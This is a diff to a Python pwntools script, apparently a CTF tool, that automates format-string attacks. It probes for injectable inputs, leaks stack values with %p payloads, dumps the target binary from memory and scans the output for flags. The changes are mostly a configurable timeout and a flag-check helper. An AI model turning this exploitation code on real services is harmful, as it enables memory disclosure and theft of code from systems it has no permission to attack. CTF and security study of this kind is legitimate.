@@ -50,10 +50,14 @@ class ffstr():
 		# Dump binary
 		self.dump_name = None
 		
+		# Timeout between connection
+		self.timeout = None
+		
 		
 	def getArgs(self):
 		# Get args from pwntools
 
+		# How to access to the challenge
 		if args["BINARY"].find(":") > -1 :
 			self.location = "remote"
 			self.ip, self.port = args["BINARY"].split(":")
@@ -61,9 +65,11 @@ class ffstr():
 			self.location = "local"
 			self.path = args["BINARY"]
 			
+		# Supporting ELF file
 		if "ELF" in args.keys():
 			self.elf  = ELF(args["ELF"])
-			
+		
+		# 32bits or 64 bits
 		if "BITS" in args.keys():
 			if args["BITS"] == "32":
 				self.bits = 32
@@ -75,6 +81,17 @@ class ffstr():
 				# By default
 				self.bits = 64
 				self.block_byte = 8
+				
+		# Timeout setting
+		if "TOUT" in args.keys():
+			self.timeout = float(args["TOUT"]) 
+		else:
+			self.timeout = 0.25
+		print(self.timeout,args)
+		
+	def yesno(self):
+		# yes or no for further analysis
+		return input("Continue y/n :").strip().lower() == "y"
 		
 	def connect(self):
 		# Connection to the chall
@@ -101,7 +118,7 @@ class ffstr():
 					pos = line.find(elt)
 					self.delimiters = (line[:pos],line[pos+len(elt):])
 		
-	def mimic(self,sequence,payload,t_out=0.25,fake=b"a"):
+	def mimic(self,sequence,payload,fake=b"a"):
 		# Mimic the software behavior from observe behavior
 		
 		# Connect tubes
@@ -118,11 +135,11 @@ class ffstr():
 			n += 1
 
 		# One liner for dumping all the received data
-		data = self.io.recvall(timeout=t_out)
+		data = self.io.recvall(timeout=self.timeout)
 
 		return n,data
 		
-	def mentalist(self,nb_input=5,t_out=2):
+	def mentalist(self,nb_input=5):
 	
 		# Return a list of injectable parameters
 		log.progress("You have called the mentalist ...")
@@ -178,7 +195,7 @@ class ffstr():
 		return payload
 		
 	
-	def stackDump(self,nb_elt=100,t_out=2):
+	def stackDump(self,nb_elt=100):
 		# Dump the stack, maximum of nb_elt element
 		
 		# Store the stack
@@ -202,7 +219,17 @@ class ffstr():
 		
 		log.info(str(len(self.stack))+" stack elements recovered")
 
-		
+	def checkflag(self,txt):
+		# Regex generic flag format
+		flags = re.findall(self.re_FlagPattern, txt)
+		if flags:
+			for flag in flags:
+				log.success(flag.decode())
+				
+				# Continue or not ?
+				if not self.yesno():
+					exit(1)
+					
 	def stackAnalyze(self):
 		
 		## Stage 0 - Get a copy of self.stack
@@ -221,15 +248,13 @@ class ffstr():
 				# In case of error, or nil/null values
 				txt += b"\x00"*self.block_byte
 		
-		# Showin Hexdump
+		# Showing Hexdump
 		print(hexdump(txt))
-			
-		# Regex generic flag format
-		flags = re.findall(self.re_FlagPattern, txt)
-		if flags:
-			for flag in flags:
-				log.success(flag.decode())
 		
+		# Checking flag
+		self.checkflag(txt)
+
+					
 		# Regex generic stack payload
 		fmts = re.findall(self.re_ArgPattern, txt)
 		if fmts:
@@ -270,7 +295,7 @@ class ffstr():
 			
 		return offset
 			
-	def asyncExchange(self,exploit,t_out=0.25,fake=b"a"):
+	def asyncExchange(self,exploit,fake=b"a"):
 		# Step by Step Exchange with binary for leaking and exploitation purpose
 		# self.behavior counts exchanged step
 		
@@ -299,9 +324,9 @@ class ffstr():
 		ti = time()
 		data = b""
 		## do go above timeout and is still connected
-		while time()-ti < t_out and self.io.connected():
+		while time()-ti < self.timeout and self.io.connected():
 			try:
-				data += self.io.recvline(timeout=t_out)
+				data += self.io.recvline(timeout=self.timeout)
 			except:
 				# Cleaning
 				data += self.io.recvall()
@@ -335,7 +360,7 @@ class ffstr():
 				# Leak an hexadecimal value
 				leak = None
 				while leak is None:
-					data = self.asyncExchange(self.stackPayload(i+1,"p"),t_out=0.05) #
+					data = self.asyncExchange(self.stackPayload(i+1,"p")) #
 					regex = re.search(self.re_HexaPattern, data)
 					if regex:
 						leak = int(regex[0],16)
@@ -352,7 +377,7 @@ class ffstr():
 				# Get Data
 				data = b""
 				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-					data = self.asyncExchange(pl,t_out=0.05)
+					data = self.asyncExchange(pl)
 
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
@@ -437,7 +462,7 @@ class ffstr():
 				self.close()
 
 			# dump regularly ~ 160 bytes
-			if len(binary) % 160 ==0:
+			if len(binary) % 160 == 0 and len(binary) != 0:
 			
 				# show dump
 				print(hexdump(binary[-160:]))
@@ -445,6 +470,7 @@ class ffstr():
 				# dump to file
 				with open(self.dump_name,"wb") as fp:
 					fp.write(binary)
+					
 				# assess pwntools happiness
 				try:
 					self.elf=ELF(self.dump_name)
@@ -513,6 +539,8 @@ class ffstr():
 				dump =data[left:right]
 				print(dump)
 
+			# Checking flag
+			self.checkflag(dump)
 				
 			# Close connexion
 			if not all(self.blind_behavior):
@@ -530,6 +558,7 @@ def help():
 	BINARY          Link to the chall either as a path ./chall or url 127.0.0.1:1337
 	ELF             Link to the supporting elf file, path only
 	BITS            32 or 64 bits
+	TOUT		Timeout in seconds
 	
 	Examples:
 	
@@ -540,14 +569,16 @@ def help():
 	""")
 if __name__ == "__main__":
 	
+	# Help menu
 	if not args:
 		help()
 		exit()
+		
 	# ffstr instanciation
 	exploit = ffstr()
 	exploit.getArgs()
-	exploit.mentalist(nb_input=10,t_out=0.25)
-	exploit.stackDump(nb_elt=100,t_out=0.25)
+	exploit.mentalist(nb_input=10)
+	exploit.stackDump(nb_elt=100)
 	exploit.stackAnalyze()
 	exploit.locateBinary()
 	exploit.dumpBinary()
